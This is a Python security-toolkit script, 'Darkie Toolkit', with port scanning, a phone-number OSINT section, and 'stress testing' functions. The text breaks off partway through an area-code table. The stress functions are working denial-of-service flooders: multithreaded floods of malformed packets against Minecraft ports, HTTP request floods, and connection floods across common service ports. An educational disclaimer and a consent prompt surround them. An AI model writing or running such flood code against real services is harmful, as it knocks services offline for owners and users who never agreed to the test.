#!/usr/bin/env python3
"""
Darkie Toolkit v1.3 — Cybersecurity & Network Testing Suite
Educational use only. Test only systems you own or have permission to test.
"""

import importlib
import ipaddress
import json
import os
import platform
import random
import re
import shutil
import smtplib
import socket
import ssl
import string
import subprocess
import sys
import textwrap
import time
import threading
import warnings
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from urllib.parse import urlparse

warnings.filterwarnings("ignore")

MISSING_PIPS = []
MISSING_SYSTEM = []

PIP_DEPS = {
    "colorama": "colorama",
    "requests": "requests",
}

SYSTEM_DEPS_COMMON = {
    "nmap": "nmap",
    "host": "host",
    "figlet": "figlet",
    "whois": "whois",
    "dig": "bind9-dnsutils",
}

SYSTEM_DEPS_BY_MGR = {
    "apt":     {"host": "dnsutils", "dig": "dnsutils", "whois": "whois"},
    "dnf":     {"host": "bind-utils", "dig": "bind-utils", "whois": "whois"},
    "pacman":  {"host": "bind-tools", "dig": "bind-tools", "whois": "whois"},
    "apk":     {"host": "bind-tools", "dig": "bind-tools", "whois": "whois"},
    "zypper":  {"host": "bind-utils", "dig": "bind-utils", "whois": "whois"},
    "brew":    {"host": "bind", "dig": "bind", "whois": "whois"},
    "choco":   {"host": "bind-tool", "dig": "bind-tool", "whois": "whois"},
}

GRADIENT = [
    "\033[38;5;46m",
    "\033[38;5;47m",
    "\033[38;5;48m",
    "\033[38;5;49m",
    "\033[38;5;50m",
    "\033[38;5;51m",
    "\033[38;5;45m",
    "\033[38;5;39m",
]

G = "\033[92m"
Y = "\033[93m"
C = "\033[96m"
R = "\033[91m"
M = "\033[95m"
B = "\033[1m"
DIM = "\033[2m"
N = "\033[0m"

SYM_CHECK = "\u2713"
SYM_X = "\u2717"
SYM_WARN = "\u26a0"
SYM_ARROW = "\u2192"
SYM_PROMPT = "\u279c"
SYM_CLOCK = "\u23f0"
SYM_BLOCK_FULL = "\u2588"
SYM_BLOCK_EMPTY = "\u2591"
SYM_BOX_TL = "\u2554"
SYM_BOX_TR = "\u2557"
SYM_BOX_BL = "\u255a"
SYM_BOX_BR = "\u255d"
SYM_BOX_H = "\u2550"
SYM_BOX_V = "\u2551"
SYM_LINE_H = "\u2500"
SYM_LINE_V = "\u251c"


def _detect_os():
    system = platform.system().lower()
    if system == "linux":
        try:
            with open("/etc/os-release") as f:
                data = f.read()
        except FileNotFoundError:
            return "linux", "unknown"
        if re.search(r'ID=("?)debian', data) or re.search(r'ID_LIKE=.*debian', data):
            return "linux", "apt"
        if re.search(r'ID=("?)(ubuntu|linuxmint|pop|kali)', data):
            return "linux", "apt"
        if re.search(r'ID=("?)(rhel|centos|fedora|rocky|alma)', data):
            return "linux", "dnf"
        if re.search(r'ID=("?)(arch|manjaro|endeavour)', data):
            return "linux", "pacman"
        if re.search(r'ID=("?)alpine', data):
            return "linux", "apk"
        if re.search(r'ID=("?)(opensuse|suse)', data):
            return "linux", "zypper"
        return "linux", "unknown"
    elif system == "darwin":
        return "macos", "brew"
    elif system == "windows":
        return "windows", "choco"
    return system, "unknown"


def _check_pip_deps():
    global MISSING_PIPS
    for mod, pkg in PIP_DEPS.items():
        try:
            importlib.import_module(mod)
        except ImportError:
            MISSING_PIPS.append(pkg)


def _check_system_deps():
    global MISSING_SYSTEM
    _, pkg_mgr = _detect_os()
    per_mgr = SYSTEM_DEPS_BY_MGR.get(pkg_mgr, {})
    for cmd, default_pkg in SYSTEM_DEPS_COMMON.items():
        if shutil.which(cmd) is None:
            pkg = per_mgr.get(cmd, default_pkg)
            MISSING_SYSTEM.append((cmd, pkg))


PKG_MANAGERS = {
    "apt":     {"install": ["apt-get", "install", "-y", "-qq"], "update": ["apt-get", "update", "-qq"]},
    "dnf":     {"install": ["dnf", "install", "-y"], "update": None},
    "pacman":  {"install": ["pacman", "-S", "--noconfirm"], "update": ["pacman", "-Sy"]},
    "apk":     {"install": ["apk", "add"], "update": ["apk", "update"]},
    "zypper":  {"install": ["zypper", "install", "-y"], "update": ["zypper", "refresh"]},
    "brew":    {"install": ["brew", "install"], "update": ["brew", "update"]},
    "choco":   {"install": ["choco", "install", "-y"], "update": None},
}


def _run_as_admin(cmd_list, reason=""):
    desc = " ".join(cmd_list)
    print(f"  {C}{reason or desc}{N}")
    try:
        r = subprocess.run(cmd_list, capture_output=True, text=True, timeout=300)
        if r.returncode == 0:
            print(f"  {G}{SYM_CHECK}  Success{N}")
        else:
            print(f"  {R}{SYM_X}  Failed (exit {r.returncode}){N}")
            if r.stderr.strip():
                for line in r.stderr.strip().splitlines()[-3:]:
                    print(f"    {R}{line}{N}")
        return r.returncode == 0
    except Exception as e:
        print(f"  {R}{SYM_X}  Error: {e}{N}")
        return False


def _install_missing():
    os_name, pkg_mgr = _detect_os()

    if MISSING_PIPS:
        print(f"\n  {Y}Installing Python packages: {', '.join(MISSING_PIPS)}{N}")
        pip_cmd = [sys.executable, "-m", "pip", "install"] + MISSING_PIPS
        _run_as_admin(pip_cmd, "pip install " + " ".join(MISSING_PIPS))

    if MISSING_SYSTEM:
        missing_names = [pkg for _, pkg in MISSING_SYSTEM]
        print(f"\n  {Y}Installing system packages: {', '.join(missing_names)}{N}")

        info = PKG_MANAGERS.get(pkg_mgr)
        if info is None:
            print(f"  {R}{SYM_X}  Unsupported package manager for {pkg_mgr}")
            print(f"    Install manually: {' '.join(missing_names)}{N}")
            return

        for cmd, pkg in MISSING_SYSTEM:
            if info["update"]:
                _run_as_admin(info["update"], f"Updating {pkg_mgr} cache")
                break

        install_cmd = info["install"] + [pkg for _, pkg in MISSING_SYSTEM]
        _run_as_admin(install_cmd, f"Installing with {pkg_mgr}")


def ensure_deps():
    print(f"\n{C}{B}{SYM_BOX_TL}{'='*50}{SYM_BOX_TR}{N}")
    print(f"{C}{B}{SYM_BOX_V}  Checking dependencies...{' ' * 29}{SYM_BOX_V}{N}")
    print(f"{C}{B}{SYM_BOX_BL}{'='*50}{SYM_BOX_BR}{N}")

    _check_pip_deps()
    _check_system_deps()

    if MISSING_PIPS or MISSING_SYSTEM:
        if MISSING_PIPS:
            print(f"  {Y}{SYM_WARN}  Missing Python packages: {', '.join(MISSING_PIPS)}{N}")
        if MISSING_SYSTEM:
            missing_names = [pkg for _, pkg in MISSING_SYSTEM]
            print(f"  {Y}{SYM_WARN}  Missing system tools: {', '.join(missing_names)}{N}")
        print()
        choice = input(f"  {C}Install missing dependencies? (yes/no) {SYM_PROMPT} {N}").strip().lower()
        if choice == "yes":
            _install_missing()
            print()
            _check_pip_deps()
            _check_system_deps()
            if MISSING_PIPS or MISSING_SYSTEM:
                print(f"  {R}{SYM_X}  Some deps still missing. Trying to continue anyway...{N}")
            else:
                print(f"  {G}{SYM_CHECK}  All dependencies satisfied!{N}")
        else:
            print(f"  {Y}{SYM_WARN}  Skipping installation. Script may not work correctly.{N}")
    else:
        print(f"  {G}{SYM_CHECK}  All dependencies found!{N}")


ensure_deps()

from colorama import init, Fore, Style, Back
import requests

init(autoreset=True)


BANNER_LINES = [
    " _____             _    _        _______        _    _    _ _   _",
    "|  __ \\           | |  (_)      |__   __|      | |  | |  | | | | |",
    "| |  | | __ _ _ __| | ___  ___     | | ___  ___| | _| | _| | |_| |__",
    "| |  | |/ _` | '__| |/ / |/ _ \\    | |/ _ \\/ __| |/ / |/ / | __| '_ \\",
    "| |__| | (_| | |  |   <| |  __/    | |  __/\\__ \\   <|   <| | |_| | | |",
    "|_____/ \\__,_|_|  |_|\\_\\_|\\___|    |_|\\___||___/_|\\_\\_|\\_\\_|\\__|_| |_|",
]


def c(string, color=Fore.GREEN):
    return f"{color}{Style.BRIGHT}{string}{Style.RESET_ALL}"


def c_dim(string, color=Fore.GREEN):
    return f"{color}{Style.DIM}{string}{Style.RESET_ALL}"


def gradient_line(line):
    out = ""
    for i, ch in enumerate(line):
        idx = min(i % len(GRADIENT), len(GRADIENT) - 1)
        out += f"{GRADIENT[idx]}{Style.BRIGHT}{ch}{N}"
    return out


def gradient_banner():
    for line in BANNER_LINES:
        print(f"  {gradient_line(line)}")


def header_box(title, color=Fore.CYAN, width=62):
    top = f"{color}{Style.BRIGHT}{SYM_BOX_TL}{'='*(width-2)}{SYM_BOX_TR}{Style.RESET_ALL}"
    mid = f"{color}{Style.BRIGHT}{SYM_BOX_V} {title.center(width-4)} {SYM_BOX_V}{Style.RESET_ALL}"
    bot = f"{color}{Style.BRIGHT}{SYM_BOX_BL}{'='*(width-2)}{SYM_BOX_BR}{Style.RESET_ALL}"
    print(f"\n{top}\n{mid}\n{bot}\n")


def print_banner():
    gradient_banner()
    header_box("Cybersecurity & Network Testing Suite v1.3", Fore.CYAN)
    label_author = SYM_CLOCK + " Author:"
    label_purpose = SYM_WARN + " Purpose:"
    print(f"  {c(label_author, Fore.CYAN)} Darkie Tester")
    print(f"  {c(label_purpose, Fore.CYAN)} Educational security testing & OSINT research\n")
    print(f"  {Back.RED}{Fore.WHITE}{Style.BRIGHT} DISCLAIMER {Style.RESET_ALL}{Fore.YELLOW}  Educational use only. You must own or have permission to test the target.{Style.RESET_ALL}")
    print()


def info_box(title, content_lines, color=Fore.CYAN):
    print(f"  {color}{Style.BRIGHT}{SYM_BOX_TL}{'='*56}{SYM_BOX_TR}{Style.RESET_ALL}")
    print(f"  {color}{Style.BRIGHT}{SYM_BOX_V}  {title.center(52)}  {SYM_BOX_V}{Style.RESET_ALL}")
    print(f"  {color}{Style.BRIGHT}{SYM_BOX_V}{'='*56}{SYM_BOX_V}{Style.RESET_ALL}")
    for line in content_lines:
        label = f"  {color}{Style.BRIGHT}{SYM_BOX_V}{Style.RESET_ALL}  {line}"
        if len(label) > 60:
            label = label[:59] + "..."
        print(f"  {label}")
    print(f"  {color}{Style.BRIGHT}{SYM_BOX_BL}{'='*56}{SYM_BOX_BR}{Style.RESET_ALL}")


def progress_bar(current, total, bar_len=40):
    filled = int(bar_len * current // total) if total else 0
    bar = f"{Fore.GREEN}{SYM_BLOCK_FULL*filled}{Fore.WHITE}{SYM_BLOCK_EMPTY*(bar_len-filled)}{Style.RESET_ALL}"
    pct = f"{Fore.CYAN}{current}/{total}{Style.RESET_ALL}"
    return f"    [{bar}] {pct}"


def legal_warning(test_type):
    warn = SYM_WARN * 3
    print(f"\n  {Back.RED}{Fore.WHITE}{Style.BRIGHT} {warn}  YOU ARE ABOUT TO LAUNCH A {test_type.upper()} ATTACK  {warn} {Style.RESET_ALL}")
    print(f"  {Fore.YELLOW}By proceeding, you confirm you have permission or this is your own system.{Style.RESET_ALL}")
    label = f"Type YES to proceed or anything else to cancel {SYM_PROMPT} "
    choice = input(f"  {c(label, Fore.CYAN)}")
    if choice.strip().upper() != "YES":
        return False
    print()
    return True


# ──────────────────────────────────────────────────────
#  SECTION 1: STRESS TESTING (v1.2 inherited)
# ──────────────────────────────────────────────────────

def resolve_domain(target):
    ip = target
    try:
        socket.inet_aton(target)
        print(f"  {c(SYM_CHECK + ' Using direct IP:', Fore.GREEN)} {target}")
        return ip
    except OSError:
        pass
    try:
        ip = socket.gethostbyname(target)
        print(f"  {c(SYM_CHECK + ' Resolved:', Fore.GREEN)} {target} {SYM_ARROW} {ip}")
    except socket.gaierror:
        print(f"  {c(SYM_X + ' Could not resolve domain.', Fore.RED)}")
        return None
    try:
        result = subprocess.run(["host", target], capture_output=True, text=True, timeout=10)
        if result.stdout.strip():
            print(f"  {c('DNS Records:', Fore.CYAN)}")
            for line in result.stdout.splitlines():
                if line.strip():
                    print(f"    {Fore.GREEN}{line}{Style.RESET_ALL}")
    except Exception as e:
        print(f"  {c_dim(f'host command skipped: {e}', Fore.YELLOW)}")
    return ip


MINECRAFT_PORTS = [25565, 25566, 25575, 19132, 19133]


def nmap_scan(target):
    header_box(f"Port Scan: {target}", Fore.MAGENTA)
    open_ports = []
    try:
        print(f"  {c('Phase 1 - Scanning top 100 ports...', Fore.CYAN)}")
        result = subprocess.run(["nmap", "-T4", "-F", target], capture_output=True, text=True, timeout=120)
        for line in result.stdout.splitlines():
            m = re.match(r'^(\d+)/tcp\s+open', line)
            if m:
                open_ports.append(int(m.group(1)))
    except Exception as e:
        print(f"  {c_dim(f'Fast scan skipped: {e}', Fore.YELLOW)}")
    try:
        print(f"  {c('Phase 2 - Probing Minecraft ports...', Fore.CYAN)}")
        mc_ports_str = ",".join(str(p) for p in MINECRAFT_PORTS)
        result = subprocess.run(["nmap", "-T4", "-p", mc_ports_str, target], capture_output=True, text=True, timeout=60)
        for line in result.stdout.splitlines():
            m = re.match(r'^(\d+)/tcp\s+open', line)
            if m:
                port = int(m.group(1))
                if port not in open_ports:
                    open_ports.append(port)
    except Exception as e:
        print(f"  {c_dim(f'Minecraft probe skipped: {e}', Fore.YELLOW)}")
    open_ports.sort()
    if open_ports:
        print(f"\n  {c(SYM_CHECK + ' Open Ports Found:', Fore.GREEN)}")
        for p in open_ports:
            svc = socket.getservbyport(p) if p <= 65535 else "unknown"
            try:
                svc = socket.getservbyport(p)
            except OSError:
                svc = "unknown"
            tag = f" {Fore.YELLOW}[MINECRAFT]{Style.RESET_ALL}" if p in MINECRAFT_PORTS else ""
            print(f"    {SYM_LINE_V}{SYM_LINE_H} {Fore.GREEN}{p}{Style.RESET_ALL} ({Fore.CYAN}{svc}{Style.RESET_ALL}){tag}")
    else:
        print(f"\n  {c('No open ports detected.', Fore.YELLOW)}")
    print(f"\n{Fore.MAGENTA}{SYM_LINE_H*40}{Style.RESET_ALL}")
    return open_ports


# ── Minecraft Stress ─────────────────────────────

MINECRAFT_PAYLOADS = [
    b"\x00\xff\xff\xff\xff\x01\x00",
    b"\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xff",
    b"\xfe\x01\x00",
    b"\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00",
    b"\x00" * 64,
    b"\xff" * 128,
]


def _mc_worker(ip, port, results, idx):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(2.0)
        sock.connect((ip, port))
        payload = MINECRAFT_PAYLOADS[idx % len(MINECRAFT_PAYLOADS)]
        sock.sendall(payload)
        sock.close()
        results[idx] = 1
    except Exception:
        results[idx] = 0


def minecraft_stress(ip, port, num_packets, threads=200):
    header_box(f"Minecraft Stress Test {SYM_ARROW} {ip}:{port}", Fore.RED)
    start = time.time()
    sent = 0
    done = 0
    batch_size = threads * 8
    try:
        for batch_start in range(0, num_packets, batch_size):
            batch_end = min(batch_start + batch_size, num_packets)
            batch = list(range(batch_start, batch_end))
            batch_results = {}
            with ThreadPoolExecutor(max_workers=threads) as executor:
                futures = {executor.submit(_mc_worker, ip, port, batch_results, i): i for i in batch}
                for f in as_completed(futures):
                    f.result()
            for v in batch_results.values():
                sent += v
                done += 1
            sys.stdout.write(f"\r{progress_bar(min(done, num_packets), num_packets)}  {c(f'Sent: {sent}', Fore.GREEN)}  {c(f'Errors: {done-sent}', Fore.RED)}  ")
            sys.stdout.flush()
        print()
    except KeyboardInterrupt:
        print(f"\n\n  {c(SYM_WARN + ' Interrupted.', Fore.YELLOW)}")
    elapsed = time.time() - start
    print(f"\n  {c(SYM_CHECK + ' Complete!', Fore.GREEN)} Sent {c(str(sent), Fore.CYAN)} packets in {c(f'{elapsed:.1f}s', Fore.CYAN)} ({c(f'{sent/elapsed:.1f} pkt/s', Fore.MAGENTA)})\n")


# ── Web Stress ────────────────────────────────────

def _http_worker(session, url, results, idx):
    try:
        session.get(url, timeout=8, headers={"User-Agent": "DarkieTester/1.3"})
        results[idx] = 1
    except Exception:
        results[idx] = 0


def http_stress(url, num_requests, threads=200):
    header_box(f"Web Stress Test {SYM_ARROW} {url}", Fore.RED)
    start = time.time()
    sent = 0
    done = 0
    batch_size = threads * 8
    try:
        for batch_start in range(0, num_requests, batch_size):
            batch_end = min(batch_start + batch_size, num_requests)
            batch = list(range(batch_start, batch_end))
            batch_results = {}
            with ThreadPoolExecutor(max_workers=threads) as executor:
                with requests.Session() as session:
                    futures = {executor.submit(_http_worker, session, url, batch_results, i): i for i in batch}
                    for f in as_completed(futures):
                        f.result()
            for v in batch_results.values():
                sent += v
                done += 1
            sys.stdout.write(f"\r{progress_bar(min(done, num_requests), num_requests)}  {c(f'OK: {sent}', Fore.GREEN)}  {c(f'Errors: {done-sent}', Fore.RED)}  ")
            sys.stdout.flush()
        print()
    except KeyboardInterrupt:
        print(f"\n\n  {c(SYM_WARN + ' Interrupted.', Fore.YELLOW)}")
    elapsed = time.time() - start
    print(f"\n  {c(SYM_CHECK + ' Complete!', Fore.GREEN)} Sent {c(str(sent), Fore.CYAN)} requests in {c(f'{elapsed:.1f}s', Fore.CYAN)} ({c(f'{sent/elapsed:.1f} req/s', Fore.MAGENTA)})\n")


# ── IP Stress ─────────────────────────────────────

def _ip_tcp_worker(ip, port, results, idx):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(2.0)
        sock.connect((ip, port))
        sock.sendall(b"GET / HTTP/1.0\r\n\r\n")
        sock.close()
        results[idx] = 1
    except Exception:
        results[idx] = 0


def _ip_flood_worker(ip, ports, results, idx):
    port = ports[idx % len(ports)]
    return _ip_tcp_worker(ip, port, results, idx)


STRESS_PORTS = [22, 80, 443, 8080, 8443, 3306, 5432, 6379, 27017, 9200, 5601, 9090, 3000, 8000, 8888]


def ip_stress(ip, ports, num_connections, threads=200):
    num_ports = len(ports)
    total_work = num_connections * num_ports
    header_box(f"IP Flood Test {SYM_ARROW} {ip} ({num_ports} ports, {total_work} conns)", Fore.RED)
    start = time.time()
    sent = 0
    done = 0
    batch_size = threads * 8
    try:
        for batch_start in range(0, total_work, batch_size):
            batch_end = min(batch_start + batch_size, total_work)
            batch = list(range(batch_start, batch_end))
            batch_results = {}
            with ThreadPoolExecutor(max_workers=threads) as executor:
                futures = {executor.submit(_ip_flood_worker, ip, ports, batch_results, i): i for i in batch}
                for f in as_completed(futures):
                    f.result()
            for v in batch_results.values():
                sent += v
                done += 1
            sys.stdout.write(f"\r{progress_bar(min(done, total_work), total_work)}  {c(f'OK: {sent}', Fore.GREEN)}  {c(f'Errors: {done-sent}', Fore.RED)}  ")
            sys.stdout.flush()
        print()
    except KeyboardInterrupt:
        print(f"\n\n  {c(SYM_WARN + ' Interrupted.', Fore.YELLOW)}")
    elapsed = time.time() - start
    print(f"\n  {c(SYM_CHECK + ' Complete!', Fore.GREEN)} Sent {c(str(sent), Fore.CYAN)} connections across {c(str(num_ports), Fore.MAGENTA)} ports in {c(f'{elapsed:.1f}s', Fore.CYAN)} ({c(f'{sent/elapsed:.1f} conn/s', Fore.MAGENTA)})\n")


# ──────────────────────────────────────────────────────
#  SECTION 2: OSINT RECON TOOLS
# ──────────────────────────────────────────────────────

# ═══ Phone Number OSINT ═══

COUNTRY_CODES = {
    "1": "US/CA", "44": "UK", "91": "India", "86": "China", "81": "Japan",
    "49": "Germany", "33": "France", "39": "Italy", "34": "Spain", "7": "Russia",
    "55": "Brazil", "61": "Australia", "82": "Korea", "31": "Netherlands",
    "46": "Sweden", "41": "Switzerland", "45": "Denmark", "47": "Norway",
    "358": "Finland", "48": "Poland", "90": "Turkey", "966": "Saudi Arabia",
    "971": "UAE", "972": "Israel", "27": "South Africa", "52": "Mexico",
    "54": "Argentina", "56": "Chile", "57": "Colombia", "351": "Portugal",
    "30": "Greece", "353": "Ireland", "43": "Austria", "32": "Belgium",
}

# NPA (area code) to city/state/timezone mapping for US/CA
NPA_DB = {
    "201": ("Jersey City", "NJ", "Eastern"), "202": ("Washington", "DC", "Eastern"),
    "203": ("Bridgeport", "CT", "Eastern"), "204": ("Winnipeg", "MB", "Central"),
    "205": ("Birmingham", "AL", "Central"), "206": ("Seattle", "WA", "Pacific"),
    "207": ("Portland", "ME", "Eastern"), "208": ("Boise", "ID", "Mountain"),
    "209": ("Stockton", "CA", "Pacific"), "210": ("San Antonio", "TX", "Central"),
    "212": ("New York City", "NY", "Eastern"), "213": ("Los Angeles", "CA", "Pacific"),
    "214": ("Dallas", "TX", "Central"), "215": ("Philadelphia", "PA", "Eastern"),
    "216": ("Cleveland", "OH", "Eastern"), "217": ("Springfield", "IL", "Central"),
    "218": ("Duluth", "MN", "Central"), "219": ("Gary", "IN", "Central"),
    "220": ("Columbus", "OH", "Eastern"), "223": ("Lancaster", "PA", "Eastern"),
    "224": ("Chicago", "IL", "Central"), "225": ("Baton Rouge", "LA", "Central"),
    "226": ("Windsor", "ON", "Eastern"), "228": ("Gulfport", "MS", "Central"),
    "229": ("Albany", "GA", "Eastern"), "231": ("Muskegon", "MI", "Eastern"),
    "234": ("Akron", "OH", "Eastern"), "236": ("Vancouver", "BC", "Pacific"),
    "239": ("Fort Myers", "FL", "Eastern"), "240": ("Rockville", "MD", "Eastern"),
    "242": ("Nassau", "BS", "Eastern"), "246": ("Bridgetown", "BB", "Atlantic"),
    "248": ("Troy", "MI", "Eastern"), "249": ("Sudbury", "ON", "Eastern"),
    "250": ("Victoria", "BC", "Pacific"), "251": ("Mobile", "AL", "Central"),
    "252": ("Greenville", "NC", "Eastern"), "253": ("Tacoma", "WA", "Pacific"),
    "254": ("Waco", "TX", "Central"), "256": ("Huntsville", "AL", "Central"),
    "260": ("Fort Wayne", "IN", "Eastern"), "262": ("Kenosha", "WI", "Central"),
    "264": ("Anguilla", "AI", "Atlantic"), "267": ("Philadelphia", "PA", "Eastern"),
    "268": ("St. John's", "AG", "Atlantic"), "269": ("Kalamazoo", "MI", "Eastern"),
    "270": ("Bowling Green", "KY", "Central"), "272": ("Scranton", "PA", "Eastern"),
    "274": ("Green Bay", "WI", "Central"), "276": ("Bristol", "VA", "Eastern"),
    "279": ("Sacramento", "CA", "Pacific"), "281": ("Houston", "TX", "Central"),
    "283": ("Cincinnati", "OH", "Eastern"), "284": ("Road Town", "VG", "Atlantic"),
    "289": ("Toronto", "ON", "Eastern"), "301": ("Bethesda", "MD", "Eastern"),
    "302": ("Wilmington", "DE", "Eastern"), "303": ("Denver", "CO", "Mountain"),
    "304": ("Charleston", "WV", "Eastern"), "305": ("Miami", "FL", "Eastern"),
    "306": ("Saskatoon", "SK", "Central"), "307": ("Cheyenne", "WY", "Mountain"),
    "308": ("Grand Island", "NE", "Central"), "309": ("Peoria", "IL", "Central"),
    "310": ("Los Angeles", "CA", "Pacific"), "312": ("Chicago", "IL", "Central"),
    "313": ("Detroit", "MI", "Eastern"), "314": ("St. Louis", "MO", "Central"),
    "315": ("Syracuse", "NY", "Eastern"), "316": ("Wichita", "KS", "Central"),
    "317": ("Indianapolis", "IN", "Eastern"), "318": ("Shreveport", "LA", "Central"),
    "319": ("Cedar Rapids", "IA", "Central"), "320": ("St. Cloud", "MN", "Central"),
    "321": ("Melbourne", "FL", "Eastern"), "323": ("Los Angeles", "CA", "Pacific"),
    "325": ("Abilene", "TX", "Central"), "327": ("Little Rock", "AR", "Central"),
    "330": ("Youngstown", "OH", "Eastern"), "331": ("Chicago", "IL", "Central"),
    "332": ("New York City", "NY", "Eastern"), "334": ("Montgomery", "AL", "Central"),
    "336": ("Greensboro", "NC", "Eastern"), "337": ("Lafayette", "LA", "Central"),
    "339": ("Boston", "MA", "Eastern"), "340": ("St. Thomas", "VI", "Atlantic"),
    "341": ("San Francisco", "CA", "Pacific"), "343": ("Ottawa", "ON", "Eastern"),
    "345": ("George Town", "KY", "Eastern"), "346": ("Houston", "TX", "Central"),
    "347": ("Brooklyn", "NY", "Eastern"), "351": ("Boston", "MA", "Eastern"),
    "352": ("Gainesville", "FL", "Eastern"), "360": ("Olympia", "WA", "Pacific"),
    "361": ("Corpus Christi", "TX", "Central"), "364": ("Paducah", "KY", "Central"),
    "365": ("Toronto", "ON", "Eastern"), "367": ("Quebec City", "QC", "Eastern"),
    "368": ("Edmonton", "AB", "Mountain"), "369": ("San Francisco", "CA", "Pacific"),
    "380": ("Columbus", "OH", "Eastern"), "385": ("Salt Lake City", "UT", "Mountain"),
    "386": ("Daytona Beach", "FL", "Eastern"), "387": ("Toronto", "ON", "Eastern"),
    "401": ("Providence", "RI", "Eastern"), "402": ("Omaha", "NE", "Central"),
    "403": ("Calgary", "AB", "Mountain"), "404": ("Atlanta", "GA", "Eastern"),
    "405": ("Oklahoma City", "OK", "Central"), "406": ("Billings", "MT", "Mountain"),
    "407": ("Orlando", "FL", "Eastern"), "408": ("San Jose", "CA", "Pacific"),
    "409": ("Beaumont", "TX", "Central"), "410": ("Baltimore", "MD", "Eastern"),
    "412": ("Pittsburgh", "PA", "Eastern"), "413": ("Springfield", "MA", "Eastern"),
    "414": ("Milwaukee", "WI", "Central"), "415": ("San Francisco", "CA", "Pacific"),
    "416": ("Toronto", "ON", "Eastern"), "417": ("Springfield", "MO", "Central"),
    "418": ("Quebec City", "QC", "Eastern"), "419": ("Toledo", "OH", "Eastern"),
    "423": ("Chattanooga", "TN", "Eastern"), "424": ("Los Angeles", "CA", "Pacific"),
    "425": ("Bellevue", "WA", "Pacific"), "430": ("Tyler", "TX", "Central"),
    "431": ("Winnipeg", "MB", "Central"), "432": ("Midland", "TX", "Central"),
    "434": ("Charlottesville", "VA", "Eastern"), "435": ("St. George", "UT", "Mountain"),
    "437": ("Ottawa", "ON", "Eastern"), "438": ("Montreal", "QC", "Eastern"),
    "440": ("Cleveland", "OH", "Eastern"), "441": ("Hamilton", "BM", "Atlantic"),
    "442": ("San Diego", "CA", "Pacific"), "443": ("Baltimore", "MD", "Eastern"),
    "445": ("Philadelphia", "PA", "Eastern"), "447": ("Chicago", "IL", "Central"),
    "448": ("Tallahassee", "FL", "Eastern"), "450": ("Montreal", "QC", "Eastern"),
    "458": ("Eugene", "OR", "Pacific"), "463": ("Indianapolis", "IN", "Eastern"),
    "464": ("Chicago", "IL", "Central"), "469": ("Plano", "TX", "Central"),
    "470": ("Atlanta", "GA", "Eastern"), "473": ("St. George's", "GD", "Atlantic"),
    "475": ("Bridgeport", "CT", "Eastern"), "478": ("Macon", "GA", "Eastern"),
    "479": ("Fayetteville", "AR", "Central"), "480": ("Phoenix", "AZ", "Mountain"),
    "484": ("Allentown", "PA", "Eastern"), "501": ("Little Rock", "AR", "Central"),
    "502": ("Louisville", "KY", "Eastern"), "503": ("Portland", "OR", "Pacific"),
    "504": ("New Orleans", "LA", "Central"), "505": ("Albuquerque", "NM", "Mountain"),
    "506": ("Fredericton", "NB", "Atlantic"), "507": ("Rochester", "MN", "Central"),
    "508": ("Worcester", "MA", "Eastern"), "509": ("Spokane", "WA", "Pacific"),
    "510": ("Oakland", "CA", "Pacific"), "512": ("Austin", "TX", "Central"),
    "513": ("Cincinnati", "OH", "Eastern"), "514": ("Montreal", "QC", "Eastern"),
    "515": ("Des Moines", "IA", "Central"), "516": ("Hempstead", "NY", "Eastern"),
    "517": ("Lansing", "MI", "Eastern"), "518": ("Albany", "NY", "Eastern"),
    "519": ("London", "ON", "Eastern"), "520": ("Tucson", "AZ", "Mountain"),
    "530": ("Redding", "CA", "Pacific"), "531": ("Omaha", "NE", "Central"),
    "534": ("Eau Claire", "WI", "Central"), "539": ("Tulsa", "OK", "Central"),
    "540": ("Roanoke", "VA", "Eastern"), "541": ("Eugene", "OR", "Pacific"),
    "548": ("Toronto", "ON", "Eastern"), "551": ("Jersey City", "NJ", "Eastern"),
    "559": ("Fresno", "CA", "Pacific"), "561": ("West Palm Beach", "FL", "Eastern"),
    "562": ("Long Beach", "CA", "Pacific"), "563": ("Davenport", "IA", "Central"),
    "564": ("Seattle", "WA", "Pacific"), "567": ("Toledo", "OH", "Eastern"),
    "570": ("Scranton", "PA", "Eastern"), "571": ("Arlington", "VA", "Eastern"),
    "573": ("Columbia", "MO", "Central"), "574": ("South Bend", "IN", "Eastern"),
    "575": ("Las Cruces", "NM", "Mountain"), "579": ("Montreal", "QC", "Eastern"),
    "580": ("Lawton", "OK", "Central"), "581": ("Quebec City", "QC", "Eastern"),
    "585": ("Rochester", "NY", "Eastern"), "586": ("Warren", "MI", "Eastern"),
    "587": ("Calgary", "AB", "Mountain"), "601": ("Jackson", "MS", "Central"),
    "602": ("Phoenix", "AZ", "Mountain"), "603": ("Manchester", "NH", "Eastern"),
    "604": ("Vancouver", "BC", "Pacific"), "605": ("Sioux Falls", "SD", "Central"),
    "606": ("Ashland", "KY", "Eastern"), "607": ("Binghamton", "NY", "Eastern"),
    "608": ("Madison", "WI", "Central"), "609": ("Trenton", "NJ", "Eastern"),
    "610": ("Allentown", "PA", "Eastern"), "612": ("Minneapolis", "MN", "Central"),
    "613": ("Ottawa", "ON", "Eastern"), "614": ("Columbus", "OH", "Eastern"),
    "615": ("Nashville", "TN", "Central"), "616": ("Grand Rapids", "MI", "Eastern"),
    "617": ("Boston", "MA", "Eastern"), "618": ("Belleville", "IL", "Central"),
    "619": ("San Diego", "CA", "Pacific"), "620": ("Dodge City", "KS", "Central"),
    "623": ("Phoenix", "AZ", "Mountain"), "624": ("Charlottetown", "PE", "Atlantic"),
    "626": ("Pasadena", "CA", "Pacific"), "628": ("San Francisco", "CA", "Pacific"),
    "629": ("Nashville", "TN", "Central"), "630": ("Naperville", "IL", "Central"),
    "631": ("Ronkonkoma", "NY", "Eastern"), "636": ("St. Charles", "MO", "Central"),
    "639": ("Saskatoon", "SK", "Central"), "640": ("Atlantic City", "NJ", "Eastern"),
    "641": ("Mason City", "IA", "Central"), "646": ("Manhattan", "NY", "Eastern"),
    "647": ("Toronto", "ON", "Eastern"), "649": ("Providenciales", "TC", "Eastern"),
    "650": ("Palo Alto", "CA", "Pacific"), "651": ("St. Paul", "MN", "Central"),
    "657": ("Anaheim", "CA", "Pacific"), "658": ("Kingston", "JM", "Eastern"),
    "659": ("Birmingham", "AL", "Central"), "660": ("Sedalia", "MO", "Central"),
